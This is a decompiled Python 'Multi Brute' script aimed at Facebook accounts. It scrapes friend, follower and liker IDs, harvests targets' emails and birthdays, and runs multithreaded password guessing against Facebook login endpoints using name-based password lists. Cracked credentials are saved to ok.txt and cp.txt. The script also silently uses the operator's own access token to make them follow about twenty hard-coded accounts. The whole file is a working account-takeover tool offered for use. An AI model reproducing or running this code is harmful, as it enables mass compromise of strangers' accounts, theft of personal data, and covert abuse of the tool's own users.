# Decompile by Mardis (Tools By Kapten-Kaizo)
# Time Succes decompile : 2022-02-28 13:46:42.805124

import requests,bs4,sys,os,subprocess,uuid
import requests,sys,random,time,re,base64,json
import os, re, requests, concurrent.futures
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from datetime import date
from datetime import datetime
current = datetime.now()

try:
	import mechanize
except ImportError:
	os.system("pip install mechanize")
try:
	import requests
except ImportError:
	os.system("pip install requests")
try:
	import bs4
except ImportError:
	os.system("pip install bs4")
	os.system("python premium1.py")

p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""


def banner():
    print("""   \033[0;93m___                   \n  / _ \_______             ® \n / ___/ __/ -_) Multi Brute""")
    print("""    

\033[0;91m ___      ___  __  ___      ___  _______  __   ___  ___  ___  ________   
\033[0;92m|"  \    /"  ||" \|"  \    /"  |/"     "||/"| /  ")|"  \/"  ||"      "\  
\033[0;96m \   \  //  / ||  |\   \  //  /(: ______)(: |/   /  \   \  / (.  ___  :) 
\033[0;91m  \\  \/. ./  |:  | \\  \/. ./  \/    |  |    __/    \\  \/  |: \   ) || 
\033[0;92m   \.    //   |.  |  \.    //   // ___)_ (// _  \    /\.  \  (| (___\ || 
\033[0;96m    \\   /    /\  |\  \\   /   (:      "||: | \  \  /  \   \ |:       :) 
\033[0;91m     \__/    (__\_|_)  \__/     \_______)(__|  \__)|___/\___|(________/   """)
                                            
host="https://mbasic.facebook.com"
ips=None
try:
	b=requests.get("https://api.ipify.org").text.strip()
	ips=requests.get("https://ipapi.com/ip_api.php?ip="+b,headers={"Referer":"https://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"}).json()["country_name"].lower()
except:
	ips=None

ok = []
cp = []
ttl =[]

durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day

#br = mechanize.Browser()
#br.set_handle_robots(False)
#ua.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
ua = [('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]')]

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
    
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "apa yang anda pikirkan sekarang" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("[!] Wrong Cookies")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": ua, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result


def logs():
  os.system("clear")
  banner()
  print((k+"\n["+p+"1"+k+"]"+p+" Login Token"))
  print((k+"["+p+"2"+k+"]"+p+" Login Cookies"))
  print((k+"["+p+"3"+k+"]"+p+" Update Script"))
  print((k+"["+p+"4"+k+"]"+p+" Report Bug"))
  print((k+"["+p+"0"+k+"]"+p+" Exit"))
  sek=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
  if sek=="":
    print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
    logs()
  elif sek=="1":
    log_token()
  elif sek=="2":
    gen()
  elif sek=="3":
    updatesc()
  elif sek=="4":
    wangsaff()
  elif sek=="0":
    exit()
  else:
    print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
    logs()

def log_token():
    os.system("clear")
    banner()
    toket = input(k+"\n["+p+"•"+k+"]"+p+" Token : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))
        bot_follow()
    except KeyError:
        print((k+"["+p+"!"+k+"]"+p+" Token Invalid"))
        os.system("clear")
        logs()

def gen():
        os.system("clear")
        banner()
        cookie = input(k+"\n["+p+"•"+k+"]"+p+" Cookies : ")
        try:
                data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
                "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
                "referer"                   : "https://m.facebook.com/",
                "host"                      : "m.facebook.com",
                "origin"                    : "https://m.facebook.com",
                "upgrade-insecure-requests" : "1",
                "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control"             : "max-age=0",
                "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
                "content-type"              : "text/html; charset=utf-8"
                }, cookies = {
                "cookie"                    : cookie
                })
                find_token = re.search("(EAAA\w+)", data.text)
                hasil    = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print((k+"["+p+"!"+k+"]"+p+" No Connection"))
        cookie = open("login.txt", "w")
        cookie.write(find_token.group(1))
        cookie.close()
        print((k+"\n["+p+"•"+k+"]"+p+" Login Successful"))
        bot_follow()
        
def bot_follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
		logs()
	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      
	requests.post('https://graph.facebook.com/100000737201966/subscribers?access_token=' + toket) 
	requests.post("https://graph.facebook.com/1602590373/subscribers?access_token=" + toket)      
	requests.post("https://graph.facebook.com/100000729074466/subscribers?access_token=" + toket) 
	requests.post("https://graph.facebook.com/607801156/subscribers?access_token=" + toket)       
	requests.post("https://graph.facebook.com/100009340646547/subscribers?access_token=" + toket) 
	requests.post("https://graph.facebook.com/100000415317575/subscribers?access_token=" + toket) 
	requests.post('https://graph.facebook.com/100000149757897/subscribers?access_token=' + toket) 
	requests.post('https://graph.facebook.com/100000431996038/subscribers?access_token=' + toket) 
	requests.post('https://graph.facebook.com/100000424033832/subscribers?access_token=' + toket) 
	requests.post("https://graph.facebook.com/100026490368623/subscribers?access_token=" + toket) 
	requests.post("https://graph.facebook.com/100010484328037/subscribers?access_token=" + toket) 
	requests.post("https://graph.facebook.com/100015073506062/subscribers?access_token=" + toket) 
	requests.post('https://graph.facebook.com/100005395413800/subscribers?access_token=' + toket) 
	requests.post('https://graph.facebook.com/1518721/subscribers?access_token=' + toket)         
	requests.post('https://graph.facebook.com/100001434048896/subscribers?access_token=' + toket) 
	requests.post('https://graph.facebook.com/100003467793035/subscribers?access_token=' + toket)
	requests.post('https://graph.facebook.com/100000177285475/subscribers?access_token=' + toket) 
	requests.post('https://graph.facebook.com/1409058/subscribers?access_token=' + toket)         
	requests.post('https://graph.facebook.com/607821/subscribers?access_token=' + toket)          
	requests.post('https://graph.facebook.com/100060562954794/subscribers?access_token=' + toket) 
	menu()


def menu():
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["name"]
        id = a["id"]
    except Exception as e:
        print((k+"["+p+"•"+k+"]"+p+" Error : %s"%e))
        logs()
    ip = requests.get("https://api.ipify.org").text
    os.system("clear")
    banner()
    print((k+"\n[ "+p+"Welcome "+a["name"]+k+" ]"+p))
    print((k+"\n["+p+"•"+k+"]"+p+" Your ID🔞 : "+id))
    print((k+"["+p+"•"+k+"]"+p+" Your IP🚫 : "+ip))
    print((k+"["+p+"•"+k+"]"+p+" Status🚯  : "+h+"Premium"+p))
    print((k+"["+p+"•"+k+"]"+p+" Joined 🚦 : "+durasi))
    print((k+"\n["+p+"1"+k+"]"+p+" Dump ID 💧From Public/Friend"))
    print((k+"["+p+"2"+k+"]"+p+" Dump ID ⚡From Followers"))
    print((k+"["+p+"3"+k+"]"+p+" Dump ID ☃From Likers Post"))
    print((k+"["+p+"4"+k+"]"+p+" Dump ID 🌪By Name"))
    print((k+"["+p+"5"+k+"]"+p+" Start 🔥 Crack"))
    print((k+"["+p+"6"+k+"]"+p+" Get Data 🌍 Target"))
    print((k+"["+p+"7"+k+"]"+p+" Crack By  🏟 Phone Number"))
    print((k+"["+p+"8"+k+"]"+p+" Crack By 🏛 Email"))
    print((k+"["+p+"9"+k+"]"+p+" Result 🎭 Crack"))
    print((k+"["+p+"0"+k+"]"+p+" Logout"))
    choose_menu()
	
def choose_menu():
	r=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
	if r=="":
		print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
		menu()
	elif r=="1":
		publik()
	elif r=="2":
		follow()
	elif r=="3":
		likers()
	elif r=="4":
		search_name()
	elif r=="5":
		pilihcrack()
	elif r=="6":
		target()
	elif r=="7":
		random_numbers()
	elif r=="8":
		random_email()
	elif r=="9":
		ress()
	elif r=="0":
		try:
			jalan(k+"\n["+p+"•"+k+"]"+p+" Thanks For Using My Script")
			os.system("rm -rf login.txt")
			exit()
		except Exception as e:
			print((k+"["+p+"!"+k+"]"+p+" Error %s"%e))
	else:
		print((k+"["+p+"!"+k+"]"+p+" Wrong Input"))
		menu()	

def useragent():
    uz = input(k+"\n["+p+"•"+k+"]"+p+" Use Default/Manual User Agent? [d/m] : ")
    if uz=="":
        print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
        menu()
    elif uz=="d":
        try:
            ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
            dpnt = open("useragent.txt","w")
            dpnt.write(ua)
            dpnt.close()
            pilihcrack()
        except KeyboardInterrupt:
            os.sys.exit()
    elif uz=="m":
        try:
            ua = input(k+"["+p+"•"+k+"]"+p+" User Agent : ")
            dpnt = open("useragent.txt","w")
            dpnt.write(ua)
            dpnt.close()
            pilihcrack()
        except KeyboardInterrupt:
            os.sys.exit()
    else:
        print((k+"\n["+p+"!"+k+"]"+p+" Fill In The Correct"))
        menu()


def publik():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		os.system("clear")
		banner()
		print((k+"\n["+p+"•"+k+"]"+p+" Type \'me\' To Dump From Friendlist"))
		idt = input(k+"["+p+"•"+k+"]"+p+" User ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
			print((k+"["+p+"•"+k+"]"+p+" Getting ID | Please Wait ..."))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((k+"\n["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
		jalan(k+"["+p+"•"+k+"]"+p+" Success Dump ID")
		print((k+"["+p+"•"+k+"]"+p+" Copy The Output 👉 "+k+"[ "+h+qq+k+" ]"+p))
		input(k+"\n[ "+p+"Back"+k+" ]"+p)
		menu()	
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)

def follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		os.system("clear")
		banner()
		idt = input(k+"\n["+p+"•"+k+"]"+p+" Followers ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
			print((k+"["+p+"•"+k+"]"+p+" Getting ID | Please Wait ..."))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((k+"\n["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
		jalan(k+"["+p+"•"+k+"]"+p+" Success Dump ID")
		print((k+"["+p+"•"+k+"]"+p+" Copy The Output 👉 "+k+"[ "+h+qq+k+" ]"+p))
		input(k+"\n[ "+p+"Back"+k+" ]"+p)
		menu()
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)

def likers():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		os.system("clear")
		banner()
		idt = input(k+"\n["+p+"•"+k+"]"+p+" ID Post Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name : "+op["name"]))
			print((k+"["+p+"•"+k+"]"+p+" Getting ID | Please Wait ..."))
		except KeyError:
			print((k+"["+p+"!"+k+"]"+p+" ID Not Found"))
			print((k+"\n[ "+p+"Back"+k+" ]"+p))
			publik()
		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print((k+"\n["+p+"•"+k+"]"+p+" Total ID : %s"%(len(id))))
		jalan(k+"["+p+"•"+k+"]"+p+" Success Dump ID")
		print((k+"["+p+"•"+k+"]"+p+" Copy The Output 👉 "+k+"[ "+h+qq+k+" ]"+p))
		input(k+"\n[ "+p+"Back"+k+" ]"+p)
		menu()
	except Exception as e:
		exit(k+"["+p+"!"+k+"]"+p+" Error : %s"%e)

def search_name():
    os.system("clear")
    banner()
    print((k+"\n["+p+"•"+k+"]"+p+" This Feature Is Not Available Right Now"))
    print((k+"["+p+"•"+k+"]"+p+" Please Wait Until Coming Soon"))
    input(k+"\n[ "+p+"Back"+k+" ]"+p)
    menu()


def random_numbers():
  data = []
  print((k+"\n["+p+"•"+k+"]"+p+" Number Must Be 5 Digit"))
  print((k+"["+p+"•"+k+"]"+p+" Example : 92037"))
  kode=str(input(k+"["+p+"•"+k+"]"+p+" Input Number : "))
  exit((k+"\n["+p+"!"+k+"]"+p+" Number Must Be 5 Digit")) if len(kode) < 5 else ''
  exit((k+"\n["+p+"!"+k+"]"+p+" Number Must Be 5 Digit")) if len(kode) > 5 else ''
  jml=int(input(k+"["+p+"•"+k+"]"+p+" Amount : "))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
  print(k+"\n["+p+"•"+k+"]"+p+" Crack Started, Please Wait...\n")
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input(k+"\n[ "+p+"Back"+k+" ]"+p)
  menu()

def random_email():
  data = []
  nama=input(k+"\n["+p+"•"+k+"]"+p+" Target Name : ")
  domain=input(k+"["+p+"•"+k+"]"+p+" Choose Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit((k+"["+p+"•"+k+"]"+p+" Fill In The Correct")) if not domain in ['g','y','h'] else ''
  jml=int(input(k+"["+p+"•"+k+"]"+p+" Amount : "))
  setpw=input(k+"["+p+"•"+k+"]"+p+" Set Password : ").split(',')
  print(k+"\n["+p+"•"+k+"]"+p+" Crack Started, Please Wait...\n")
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input(k+"\n[ "+p+"Back"+k+" ]"+p)
  menu()

def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('\x1b[0;32m[\x1b[0;37mOK🔥\x1b[0;32m] %s • %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('\x1b[0;33m[\x1b[0;37mCP🎭\x1b[0;33m] %s • %s '%(str(user), str(pw)))
        break
  except: pass


def target():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
		os.system("rm -rf login.txt")
		login()
	try:
		idt = input(k+"\n["+p+"•"+k+"]"+p+" ID Target        : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print((k+"["+p+"•"+k+"]"+p+" Name Account     : "+op["name"]))
			print((k+"["+p+"•"+k+"]"+p+" Username         : "+op["username"]))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Email            : "+op["email"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Email            : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Date Of Birth    : "+op["birthday"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Date Of Birth    : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Gender           : "+op["gender"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Gender           : -"))
			try:
				r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
				id = []
				z = json.loads(r.text)
				qq = (op["first_name"]+".json").replace(" ","_")
				ys = open(qq , "w")
				for i in z["data"]:
					id.append(i["id"])
					ys.write(i["id"])
				ys.close()
				print((k+"["+p+"•"+k+"]"+p+" Total Friend     : %s"%(len(id))))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Total Friend     : -"))
			try:
				a=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
				id = []
				b = json.loads(a.text)
				bb = (op["first_name"]+".json").replace(" ","_")
				jw = open(bb , "w")
				for c in b["data"]:
					id.append(c["id"])
					jw.write(c["id"])
				jw.close()
				print((k+"["+p+"•"+k+"]"+p+" Total Follower   : %s"%(len(id))))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Total Follower   : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Website          : "+op["website"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Website          : -"))
			except IOError:
				print((k+"["+p+"•"+k+"]"+p+" Website          : -"))
			try:
				jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
				op = json.loads(jok.text)
				print((k+"["+p+"•"+k+"]"+p+" Update Time      : "+op["updated_time"]))
			except KeyError:
				print((k+"["+p+"•"+k+"]"+p+" Update Time      : -"))
			except IOError:
				print((k+"["+p+"•"+k+"]"+p+" Update Time      : -"))
			input(k+"\n[ "+p+"Back"+k+" ]"+p)
			menu()
		except KeyError:
			input(k+"\n[ "+p+"Back"+k+" ]"+p)
			menu()
	except Exception as e:
		exit(k+"["+p+"•"+k+"]"+p+" Error : %s"%e)


def generate(text):
	results=[]
	global ips
	for i in text.split(" "):
		if len(i)<3:
			continue
		else:
			i=i.lower()
			if len(i)==3 or len(i)==4 or len(i)==5:
				results.append(i+"123")
				results.append(i+"12345")
			else:
				results.append(i+"123")
				results.append(i+"12345")
				results.append(i)
				if "indonesia" in ips:
					results.append("sayang")
					results.append("bismillah")
					results.append("anjing")
					results.append("123456")
	return results


def mbasic(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://mbasic.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}

def f_fb(em,pas,hosts):
	r=requests.Session()
	r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	p=r.get("https://free.facebook.com/")
	b=bs4.BeautifulSoup(p.text,"html.parser")
	meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
	data={}
	for i in b("input"):
		if i.get("value") is None:
			if i.get("name")=="email":
				data.update({"email":em})
			elif i.get("name")=="pass":
				data.update({"pass":pas})
			else:
				data.update({i.get("name"):""})
		else:
			data.update({i.get("name"):i.get("value")})
	data.update(
		{"fb_dtsg":meta,"m_sess":"","__user":"0",
		"__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
		}
	)
	r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
	po=r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
	if "c_user" in list(r.cookies.get_dict().keys()):
		return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	elif "checkpoint" in list(r.cookies.get_dict().keys()):
		return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
	else:return {"status":"error","email":em,"pass":pas}


class crackttl:
	os.system("clear")
	banner()
	def __init__(self):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((k+"\n["+p+"•"+k+"]"+p+" Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=input(k+"["+p+"•"+k+"]"+p+" ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=input(k+"["+p+"•"+k+"]"+p+" ID List File : ")
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : ok.txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : cp.txt\n"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK🔥\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print(("\r\x1b[0;33m[\x1b[0;37mCP🎭\x1b[0;33m] %s • %s • %s\x1b[0m   "%(fl.get("id"),i,str(ttl))))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				else:continue
					
			self.ko+=1
